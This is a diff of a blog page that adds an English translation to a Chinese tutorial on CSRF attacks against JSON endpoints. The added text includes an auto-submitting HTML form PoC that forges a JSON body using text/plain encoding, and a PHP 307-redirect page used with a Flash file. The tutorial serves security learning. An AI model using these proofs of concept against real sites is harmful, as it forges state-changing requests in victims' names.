@@ -99,18 +99,19 @@
 
 
 
-  <meta name="description" content="JSON情景下的XSRF攻击限制条件当网站的CSRF漏洞点使用的是json数据格式的时候，进行CSRF有诸多限制  发送的数据需要为JSON格式，使用HTML表单难以构造发送JSON格式数据 Content-Type校验，使用XMLHttpRequests会向服务器发送OPTIONS预检请求  方法1当服务器没有对Content-Type进行检测的时候，这意味着我们可以发送格式为text的数据。那">
+  <meta name="description" content="XSRF attack in JSON scenariolimitation factorWhen the CSRF vulnerability point of the website uses the json data format, there are many restrictions on CSRF  The data sent needs to be in JSON format,">
 <meta property="og:type" content="article">
-<meta property="og:title" content="JSON情景下的CSRF攻击">
+<meta property="og:title" content="CSRF attack in JSON scenario&#x2F;JSON情景下的CSRF攻击">
 <meta property="og:url" content="http://ama666.cn/2021/02/08/JSON情景下的CSRF攻击/index.html">
 <meta property="og:site_name" content="ama666">
-<meta property="og:description" content="JSON情景下的XSRF攻击限制条件当网站的CSRF漏洞点使用的是json数据格式的时候，进行CSRF有诸多限制  发送的数据需要为JSON格式，使用HTML表单难以构造发送JSON格式数据 Content-Type校验，使用XMLHttpRequests会向服务器发送OPTIONS预检请求  方法1当服务器没有对Content-Type进行检测的时候，这意味着我们可以发送格式为text的数据。那">
+<meta property="og:description" content="XSRF attack in JSON scenariolimitation factorWhen the CSRF vulnerability point of the website uses the json data format, there are many restrictions on CSRF  The data sent needs to be in JSON format,">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210208132632.png">
-<meta property="og:updated_time" content="2021-02-08T20:05:59.748Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210208132632.png">
+<meta property="og:updated_time" content="2021-10-23T02:25:41.835Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="JSON情景下的CSRF攻击">
-<meta name="twitter:description" content="JSON情景下的XSRF攻击限制条件当网站的CSRF漏洞点使用的是json数据格式的时候，进行CSRF有诸多限制  发送的数据需要为JSON格式，使用HTML表单难以构造发送JSON格式数据 Content-Type校验，使用XMLHttpRequests会向服务器发送OPTIONS预检请求  方法1当服务器没有对Content-Type进行检测的时候，这意味着我们可以发送格式为text的数据。那">
+<meta name="twitter:title" content="CSRF attack in JSON scenario&#x2F;JSON情景下的CSRF攻击">
+<meta name="twitter:description" content="XSRF attack in JSON scenariolimitation factorWhen the CSRF vulnerability point of the website uses the json data format, there are many restrictions on CSRF  The data sent needs to be in JSON format,">
 <meta name="twitter:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210208132632.png">
 
 
@@ -129,7 +130,7 @@
   };
 </script>
 
-  <title>JSON情景下的CSRF攻击 | ama666</title>
+  <title>CSRF attack in JSON scenario/JSON情景下的CSRF攻击 | ama666</title>
   
 
 
@@ -383,7 +384,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">JSON情景下的CSRF攻击
+          <h1 class="post-title" itemprop="name headline">CSRF attack in JSON scenario/JSON情景下的CSRF攻击
 
               
             
@@ -426,7 +427,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2021-02-09 04:05:59" itemprop="dateModified" datetime="2021-02-09T04:05:59+08:00">2021-02-09</time>
+                <time title="修改时间：2021-10-23 10:25:41" itemprop="dateModified" datetime="2021-10-23T10:25:41+08:00">2021-10-23</time>
               
             
           </span>
@@ -467,7 +468,39 @@
       
 
       
-        <h1 id="JSON情景下的XSRF攻击"><a href="#JSON情景下的XSRF攻击" class="headerlink" title="JSON情景下的XSRF攻击"></a>JSON情景下的XSRF攻击</h1><h2 id="限制条件"><a href="#限制条件" class="headerlink" title="限制条件"></a>限制条件</h2><p>当网站的CSRF漏洞点使用的是json数据格式的时候，进行CSRF有诸多限制</p>
+        <h1 id="XSRF-attack-in-JSON-scenario"><a href="#XSRF-attack-in-JSON-scenario" class="headerlink" title="XSRF attack in JSON scenario"></a>XSRF attack in JSON scenario</h1><h2 id="limitation-factor"><a href="#limitation-factor" class="headerlink" title="limitation factor"></a>limitation factor</h2><p>When the CSRF vulnerability point of the website uses the json data format, there are many restrictions on CSRF</p>
+<ul>
+<li>The data sent needs to be in JSON format, it is difficult to construct and send JSON format data using HTML forms</li>
+<li>Content-Type verification, using XMLHttpRequests will send OPTIONS pre-check requests to the server</li>
+</ul>
+<h2 id="method-1"><a href="#method-1" class="headerlink" title="method 1"></a>method 1</h2><p>When the server does not detect Content-Type, it means that we can send data in text format. Then the only problem is to use HTML forms to construct JSON format data.</p>
+<p>The solution is to add a set of invalid key-value pairs to the form.</p>
+<p>Assuming that the normally sent form is</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span>:<span class="string">"attacker"</span>,</span><br><span class="line">  <span class="attr">"email"</span>:<span class="string">"attacker@gmail.com"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>And our usual HTML form construction code is</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>JSON CSRF POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span> JSON CSRF POC <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">'id'</span> <span class="attr">action</span>=<span class="string">http://vul-app.com</span> <span class="attr">method</span>=<span class="string">post</span> <span class="attr">enctype</span>=<span class="string">"text/plain"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"name"</span>, <span class="attr">value</span>=<span class="string">"attacker"</span>, <span class="attr">type</span>=<span class="string">'hidden'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"email"</span>, <span class="attr">value</span>=<span class="string">"attacker@gmail.com"</span>, <span class="attr">type</span>=<span class="string">'hidden'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">    var id = document.getElementById("id");</span><br><span class="line">    id.submit();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>The format of sending data is</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name=attacker</span><br><span class="line">email=attacker@gmail.com</span><br></pre></td></tr></table></figure>
+
+<p>Obviously data that does not conform to the JSON format, the server will not respond correctly. If the server doesn’t mind that we pass in an extra set of key-value pairs, then you can use the following method to automatically add the <code>=</code> to close the JSON data when transmitting the data through the HTML form.</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>JSON CSRF POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span> JSON CSRF POC <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">'id'</span> <span class="attr">action</span>=<span class="string">http://vul-app.com</span> <span class="attr">method</span>=<span class="string">post</span> <span class="attr">enctype</span>=<span class="string">"text/plain"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">'&#123;"name":"attacker","email":"attacker@gmail.com","ignore_me":"'</span> <span class="attr">value</span>=<span class="string">'test"&#125;'</span><span class="attr">type</span>=<span class="string">'hidden'</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&lt;input type=submit value="Submit"&gt;--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">    var id = document.getElementById("id");</span><br><span class="line">    id.submit();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>The format of the data sent is</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span>:<span class="string">"attacker"</span>,</span><br><span class="line">  <span class="attr">"email"</span>:<span class="string">"attacker@gmail.com"</span>,</span><br><span class="line">  <span class="attr">"ignore_me"</span>:<span class="string">"=test"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Successfully constructed JSON format data to send.</p>
+<h2 id="Method-2"><a href="#Method-2" class="headerlink" title="Method 2"></a>Method 2</h2><p>This method requires the use of Flash. When the server verifies the COntent-Type, it cannot use CSRF by simply sending text format data to construct JSON data. It requires Flash+PHP307 redirection combined to send data to the CSRF vulnerability point.</p>
+<p>The specific process is that the Flash file requests a php page, and the php page performs a 307 redirect to the CSRF vulnerability point of the target website. Since 307 is a special redirect, he will also send the data received from the flash file to the target site to complete the CSRF attack.</p>
+<p>First, we need to add the JSON data we want to send and the link to the php page in the [Flash file](<a href="http://geekboy.ninja/files/test.swf" target="_blank" rel="noopener">SWF file</a>). Use the <code>FFDec</code> tool to complete the editing of the Flash file.</p>
+<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210208132632.png" alt></p>
+<p>Then add a PHP307 jump page on your own server</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header(<span class="string">"Location: https://targetWebPage.com/victim/endpoint/"</span>, <span class="keyword">true</span>, <span class="number">307</span>);</span><br><span class="line"><span class="comment">#CSRF Vulnerability Point URL</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>At this time, you only need to ask the user to request this Flash file.</p>
+<p>There is also a simpler method. Someone wrote a more flexible and more reusable attack method on github, which also uses Flash to bypass. The difference is that instead of pre-editing Flash, Flash file variables are assigned according to the parameters in the user’s URL, and then 307 is triggered to pass JSON data. <a href="https://github.com/sp1d3r/swf_json_csrf" target="_blank" rel="noopener">Link here</a>.</p>
+<h1 id="JSON情景下的XSRF攻击"><a href="#JSON情景下的XSRF攻击" class="headerlink" title="JSON情景下的XSRF攻击"></a>JSON情景下的XSRF攻击</h1><h2 id="限制条件"><a href="#限制条件" class="headerlink" title="限制条件"></a>限制条件</h2><p>当网站的CSRF漏洞点使用的是json数据格式的时候，进行CSRF有诸多限制</p>
 <ul>
 <li>发送的数据需要为JSON格式，使用HTML表单难以构造发送JSON格式数据</li>
 <li>Content-Type校验，使用XMLHttpRequests会向服务器发送OPTIONS预检请求</li>
@@ -533,7 +566,7 @@
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
     
-    <a href="http://ama666.cn/2021/02/08/JSON情景下的CSRF攻击/" title="JSON情景下的CSRF攻击">http://ama666.cn/2021/02/08/JSON情景下的CSRF攻击/</a>
+    <a href="http://ama666.cn/2021/02/08/JSON情景下的CSRF攻击/" title="CSRF attack in JSON scenario/JSON情景下的CSRF攻击">http://ama666.cn/2021/02/08/JSON情景下的CSRF攻击/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
@@ -636,7 +669,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">68</span>
+                    <span class="site-state-item-count">66</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -774,7 +807,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#JSON情景下的XSRF攻击"><span class="nav-number">1.</span> <span class="nav-text">JSON情景下的XSRF攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#限制条件"><span class="nav-number">1.1.</span> <span class="nav-text">限制条件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#方法1"><span class="nav-number">1.2.</span> <span class="nav-text">方法1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#方法2"><span class="nav-number">1.3.</span> <span class="nav-text">方法2</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#XSRF-attack-in-JSON-scenario"><span class="nav-number">1.</span> <span class="nav-text">XSRF attack in JSON scenario</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#limitation-factor"><span class="nav-number">1.1.</span> <span class="nav-text">limitation factor</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#method-1"><span class="nav-number">1.2.</span> <span class="nav-text">method 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Method-2"><span class="nav-number">1.3.</span> <span class="nav-text">Method 2</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#JSON情景下的XSRF攻击"><span class="nav-number">2.</span> <span class="nav-text">JSON情景下的XSRF攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#限制条件"><span class="nav-number">2.1.</span> <span class="nav-text">限制条件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#方法1"><span class="nav-number">2.2.</span> <span class="nav-text">方法1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#方法2"><span class="nav-number">2.3.</span> <span class="nav-text">方法2</span></a></li></ol></li></ol></div>
             
 
           </div>
